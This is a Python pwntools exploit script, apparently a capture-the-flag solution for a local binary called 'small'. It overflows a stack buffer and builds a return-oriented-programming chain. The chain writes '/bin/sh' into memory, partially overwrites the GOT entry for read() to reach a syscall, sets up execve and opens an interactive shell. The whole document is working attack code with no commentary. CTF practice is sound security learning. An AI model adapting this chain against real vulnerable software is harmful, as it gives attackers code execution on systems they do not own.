from pwn import *

sh = process('./small')

bss = 0x601020
read_got = 0x601018
read_plt = 0x4003f0
start = 0x4004ef
read = 0x4004fb
text = 0x400000


pop_rdi = 0x400583
pop_rsi_r15 = 0x400581
pop_rdx = 0x40059a



#save_bin_sh():
payload = "A"*0x40 + p64(0x0) + p64(pop_rsi_r15) + p64(bss) + p64(0x0) + p64(pop_rdi) + p64(0x0) + p64(pop_rdx) + p64(0x8) + p64(read_plt)


#overwrite_read():
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0x0) + p64(pop_rdx) + p64(0x1) + p64(pop_rdi) + p64(0x0) + p64(read_plt)

#write_0x3b():
payload += p64(pop_rsi_r15) + p64(text) + p64(0x0) + p64(pop_rdx) + p64(0x3b) + p64(pop_rdi) + p64(0x1) + p64(read_plt)

#shell
payload += p64(pop_rdi) + p64(bss) + p64(pop_rdx) + p64(0x0) + p64(pop_rsi_r15) + p64(0x0) + p64(0x0) + p64(read_plt)

pause()
sh.send(payload)
pause()
sh.send("/bin/sh\x00")
pause()
sh.send('\xb0')
sh.interactive()

